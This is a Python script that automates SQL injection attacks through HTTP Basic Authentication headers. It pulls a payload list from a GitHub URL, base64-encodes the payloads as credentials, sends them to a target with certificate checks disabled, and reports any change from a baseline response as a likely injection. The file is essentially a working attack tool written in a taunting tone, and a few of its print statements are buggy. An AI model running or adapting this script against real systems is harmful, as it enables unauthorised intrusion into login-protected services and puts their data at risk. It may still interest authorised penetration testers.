import requests, base64, sys, urllib3, signal, argparse
from urllib.parse import urlparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description='Process a URL and perform some actions.')
parser.add_argument('url', help='The URL to process')
args = parser.parse_args()
url = args.url

def ctrl_c(signal, frame):
    print("\n\n[DISSAPOINTED] You Coward! Finish the attack!...\n")
    sys.exit(0)

signal.signal(signal.SIGINT, ctrl_c)

def GiveMe_FckinPayloads():
    request = requests.get("https://raw.githubusercontent.com/VP4triot/Pwn_Base64Login/main/Payloads_List.txt", verify=False)
    return request.text.splitlines()

def Stablish_Baseline(url):
    parsed_url = urlparse(url)
    domain = parsed_url.netloc 
    # Add headers as you wish
    headers = {
        'Host': domain,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',
        'Authorization': 'VGhpc2lzYXRlc3QxMjM0OjEyMzRUZXN0aW5n',
        'Connection': 'close',
    }

    baseline = requests.get(url, headers=headers, verify=False)
    headers_baseline = len(baseline.headers)
    body_baseline = baseline.text
    return headers_baseline, body_baseline
        
def Pwn_BasicAuth(payload, url):
    parsed_url = urlparse(url)
    domain = parsed_url.netloc 
    full_payload = "Basic " + payload
    headers = {
        'Host': domain,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',
        'Authorization': full_payload,
        'Connection': 'close',
    }

    response = requests.get(url, headers=headers, verify=False)
    headers_response = len(response.headers)
    body_response = response.text
    return headers_response, body_response
    
#    print(response.text)

def Pwnage_Comparison(headers_baseline, body_baseline, pwned_Headers, pwned_Body):
    if pwned_Headers != headers_baseline:
        print("[¡HURRA!] The header response changed, possible SQL Injection found! with {enc_payload}!")
        print("##################| SHOWING THE PWNED RESPONSE |##################")
        print(pwned_Headers, pwned_Body)
        print("##################| SHOWING THE BASELINE RESPONSE |##################")
        print(headers_baseline, body_baseline)
        sys.exit(0)
    elif pwned_Body != body_baseline:
        print("[¡HURRA!] The body response changed, possible SQL Injection found! with {enc_payload}!")
        print("##################| SHOWING THE PWNED RESPONSE |##################")
        print(pwned_Headers, pwned_Body)
        print("##################| SHOWING THE BASELINE RESPONSE |##################")
        print(headers_baseline, body_baseline)
        sys.exit(0)

if __name__ == "__main__":
    print(" [i] Stablishing Baseline... Don't rush me!")
    headers_baseline, body_baseline = Stablish_Baseline(url)
    print(" [i] Baseline Stablished!")
    payloads4good = GiveMe_FckinPayloads()
    raw_payloads = []
    for line in payloads4good:
        raw_payloads.append("{}:".format(line))
        raw_payloads.append(":{}".format(line))
        raw_payloads.append("{}".format(line))
    print(" [i] Payloads Loaded YEHAAAAAAAAA!")
    print(" [i] Proceding with SQLi Testing!")
    for payload in raw_payloads:
        enc_payloads = [base64.b64encode(payload.encode()).decode() for payload in raw_payloads]
    for enc_payload in enc_payloads:
        print(" [I] Encoded Payload:", enc_payload, "\x20"*7, "[I] Original Payload: ", base64.b64decode(enc_payload).decode())
        pwned_Headers, pwned_Body = Pwn_BasicAuth(enc_payload, url)
        Pwnage_Comparison(headers_baseline, body_baseline, pwned_Headers, pwned_Body)
    print("\n[DONE] No SQLi Found With these payloads!")
